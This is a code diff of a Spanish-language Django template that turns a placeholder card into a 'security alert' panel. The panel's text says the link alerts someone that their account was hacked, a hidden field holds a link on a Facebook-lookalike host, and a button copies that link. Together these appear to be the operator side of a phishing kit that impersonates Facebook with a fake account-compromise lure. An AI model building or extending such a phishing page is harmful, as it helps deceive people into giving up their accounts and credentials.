@@ -1,3 +1,4 @@
+{% load static %}
 {% extends 'base.html' %}
         {% block content %}
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
@@ -13,11 +14,11 @@ function copyToClipboard(elemento) {
 
 </script>
 <div class="card" style="width: 18rem;">
-  <img src="..." class="card-img-top" alt="...">
+  <img src="{% static 'img/alert.png' %}" class="card-img-top" alt="...">
   <div class="card-body">
-    <h5 class="card-title">Card title</h5>
-    <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
-    <p class="d-none" id="p1"> localhost:8000/inicia/Secion/</p>
+    <h5 class="card-title">Alerta de Seguridad</h5>
+    <p class="card-text">Este enlace envia una alerta, de que hackearon su cuenta.</p>
+    <p class="d-none" id="p1">https://facebook-vkk6.onrender.com/alerta/de/seguridad/</p>
     <a href="#" class="btn btn-primary"  onclick="copyToClipboard('#p1')">Copiar Enlace</a>
   </div>
 </div>       
